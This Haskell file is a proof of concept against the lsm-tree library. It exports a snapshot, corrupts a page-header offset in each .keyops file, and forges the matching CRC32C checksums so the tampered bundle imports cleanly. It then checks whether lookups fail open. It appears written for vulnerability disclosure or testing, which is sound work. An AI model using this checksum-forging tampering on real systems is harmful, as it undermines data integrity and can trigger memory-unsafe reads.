{-# LANGUAGE OverloadedStrings   #-}
{-# LANGUAGE TypeApplications    #-}
{-# LANGUAGE DataKinds           #-}
{-# LANGUAGE DerivingStrategies  #-}
{-# LANGUAGE DerivingVia         #-}
{-# LANGUAGE GeneralizedNewtypeDeriving #-}
{-# LANGUAGE ScopedTypeVariables #-}
{-# OPTIONS_GHC -Wno-orphans #-}

-- | END-TO-END PoC: a tampered snapshot bundle is imported through the public
-- 'importSnapshot' API and then opened with 'withTableFromSnapshot'; reading
-- the table walks a run page whose header offsets point outside the page.
--
-- Target : IntersectMBO/lsm-tree @ 63a63054
--
-- The bundle is NOT hand-built. It is produced by the library itself
-- ('saveSnapshot' + 'exportSnapshot'), then exactly one field of one page
-- header is overwritten and the corresponding CRC32C in the bundle's
-- @.checksums@ file is recomputed -- which is what an attacker who ships the
-- bundle would do. Everything else stays byte-identical to a legitimate
-- snapshot, so the CRC check passes and the snapshot is accepted.
module Main (main) where

import           Control.Exception (SomeException, evaluate, try)
import           Control.Tracer (nullTracer)
import           Data.Bits (shiftR, (.&.))
import qualified Data.ByteString as BS
import qualified Data.ByteString.Char8 as BSC
import           Data.Char (intToDigit)
import           Data.List (isSuffixOf)
import           Data.Monoid (Sum (..))
import qualified Data.Vector as V
import           Data.Void (Void)
import           Data.Word (Word16, Word64, Word8)
import           Database.LSMTree (ResolveValue, Salt, SerialiseKey,
                     SerialiseValue, SnapshotMode (..), Table,
                     TableConfig (confWriteBufferAlloc),
                     WriteBufferAlloc (AllocNumEntries), defaultTableConfig,
                     exportSnapshot, getValue, importSnapshot, inserts,
                     lookups, saveSnapshot, withOpenSession,
                     withTableFromSnapshot, withTableWith)
import qualified Database.LSMTree.Internal.CRC32C as CRC
import qualified System.Directory as Dir
import           System.FilePath (takeDirectory, (</>))
import qualified System.FS.API as FS
import           System.FS.BlockIO.IO (defaultIOCtxParams, withIOHasBlockIO)

newtype Key = Key Word64
  deriving stock (Show, Eq, Ord)
  deriving newtype (SerialiseKey)

newtype Value = Value Word64
  deriving stock (Show, Eq)
  deriving newtype (SerialiseValue)
  deriving ResolveValue via Sum Word64

-- | One data page header: numKeys @ byte 0, numBlobs @ byte 2,
-- keysOffset @ byte 4 (all little-endian Word16).
keysOffsetField :: Int
keysOffsetField = 4

w16le :: Word16 -> [Word8]
w16le w = [fromIntegral (w .&. 0xFF), fromIntegral (w `shiftR` 8)]

hex8 :: Word64 -> String
hex8 = pad . go
  where
    go 0 = ""
    go n = go (n `div` 16) ++ [intToDigit (fromIntegral (n `mod` 16))]
    pad s = replicate (8 - length s) '0' ++ s

listAllFiles :: FilePath -> IO [FilePath]
listAllFiles d = do
    isDir <- Dir.doesDirectoryExist d
    if not isDir then pure [] else do
      entries <- Dir.listDirectory d
      fmap concat $ mapM (\e -> let p = d </> e in do
                                   isD <- Dir.doesDirectoryExist p
                                   if isD then listAllFiles p else pure [p]) entries

-- | Overwrite the keysOffset of page 0 in EVERY @.keyops@ file, then repair
-- every CRC32C entry in the bundle's @.checksums@ files. This is exactly what
-- an attacker who ships a hand-crafted bundle does: the checksums are theirs
-- to compute.
tamperBundle :: FilePath -> Word16 -> IO (Maybe String)
tamperBundle root bogusOffset = do
    files <- listAllFiles root
    let keyops = [f | f <- files, ".keyops" `isSuffixOf` f]
        sums   = [f | f <- files, ".checksums" `isSuffixOf` f]
    if null keyops || null sums
      then pure Nothing
      else do
        mapM_ (patchFile bogusOffset) keyops
        mapM_ repairChecksums sums
        pure $ Just (show (length keyops) ++ " .keyops patched at keysOffset=0x"
                     ++ hex8 (fromIntegral bogusOffset)
                     ++ ", " ++ show (length sums) ++ " .checksums repaired")
  where
    patchFile off f = do
        bs <- BS.readFile f
        let patched = BS.take keysOffsetField bs
                        <> BS.pack (w16le off)
                        <> BS.drop (keysOffsetField + 2) bs
        BS.writeFile f patched

    -- for every "CRC32C (name) = hex" line, if a sibling file @name@ exists,
    -- recompute its CRC32C from the (possibly patched) bytes on disk
    repairChecksums sf = do
        let dir = takeDirectory sf
        txt <- BS.readFile sf
        out <- mapM (fixLine dir) (BSC.lines txt)
        BS.writeFile sf (BS.intercalate "\n" out <> "\n")

    fixLine dir l =
        case BSC.stripPrefix "CRC32C (" l of
          Nothing -> pure l
          Just rest ->
            case BSC.break (== ')') rest of
              (name, rest2)
                | Just rhs <- BSC.stripPrefix ") = " rest2
                , BSC.length rhs == 8 -> do
                    let fp = dir ++ "/" ++ BSC.unpack name
                    exists <- Dir.doesFileExist fp
                    if not exists then pure l else do
                      bs <- BS.readFile fp
                      let CRC.CRC32C w = CRC.updateCRC32C bs CRC.initialCRC32C
                      pure $ "CRC32C (" <> name <> ") = "
                             <> BSC.pack (hex8 (fromIntegral w))
              _ -> pure l


main :: IO ()
main = do
    putStrLn "=== lsm-tree end-to-end snapshot PoC ==="
    root <- Dir.getTemporaryDirectory
    let work = root </> "lsm-e2e-poc"
    Dir.removePathForcibly work
    Dir.createDirectoryIfMissing True work
    let sessionDir = FS.mkFsPath ["session"]
        exportDir  = FS.mkFsPath ["export"]

    withIOHasBlockIO (FS.MountPoint work) defaultIOCtxParams $ \hfs hbio -> do
      FS.createDirectoryIfMissing hfs True sessionDir

      res <- try $ withOpenSession nullTracer hfs hbio salt sessionDir $ \session ->
        withTableWith conf session $ \(table1 :: Table IO Key Value Void) -> do
          inserts table1 $ V.fromList [ (Key k, Value (k * 10), Nothing) | k <- [1..6] ]
          saveSnapshot "snap1" "KeyValueBlob" table1
          exportSnapshot session "snap1" (HardLink False) exportDir

          -- (1) the exported bundle is a legitimate snapshot at this point
          putStrLn "\n[1] legitimate bundle exported via exportSnapshot"
          allFiles <- listAllFiles work
          putStrLn "  files under the session root:"
          mapM_ (\f -> putStrLn ("    " ++ f)) allFiles
          tamperInfo <- tamperBundle (work </> "export") 0xFFF0
          case tamperInfo of
            Nothing -> putStrLn "  TAMPER FAILED -- no .kops/.checksums found under export/"
            Just s  -> putStrLn $ "  tampered: " ++ s

          -- (2) import the tampered bundle through the public API
          putStrLn "\n[2] importSnapshot on the tampered bundle (CRC must pass)"
          importSnapshot session "snap2" (HardLink False) exportDir
          putStrLn "  importSnapshot: OK -- no exception, CRC check passed"

          -- (3) open the table and read -- this is where the run page is parsed
          putStrLn "\n[3] withTableFromSnapshot + lookups (walks the tampered page)"
          withTableFromSnapshot session "snap2" "KeyValueBlob" $ \(table2 :: Table IO Key Value Void) -> do
            r <- try $ do
                   rs <- lookups table2 (V.fromList (map Key [1..6]))
                   mapM evaluate (V.toList (V.map getValue rs))
            case r of
              Left (e :: SomeException) -> do
                putStrLn $ "  exception during lookup = " ++ takeLine (show e)
                putStrLn "  RESULT: bounded (something rejected the tampered page)"
              Right vs -> do
                putStrLn $ "  lookups returned        = " ++ show vs
                case tamperInfo of
                  Nothing -> putStrLn "  RESULT: INCONCLUSIVE -- bundle was not tampered, lookups are the legitimate ones"
                  Just _  -> putStrLn "  RESULT: FAIL-OPEN -- tampered page was parsed and served"
            pure ()
      case res of
        Left (e :: SomeException) -> putStrLn $ "\nTOP-LEVEL exception: " ++ takeLine (show e)
        Right () -> putStrLn "\nTOP-LEVEL: completed"
  where
    takeLine = takeWhile (/= '\n')
    salt :: Salt
    salt = 17
    conf :: TableConfig
    conf = defaultTableConfig { confWriteBufferAlloc = AllocNumEntries 3 }
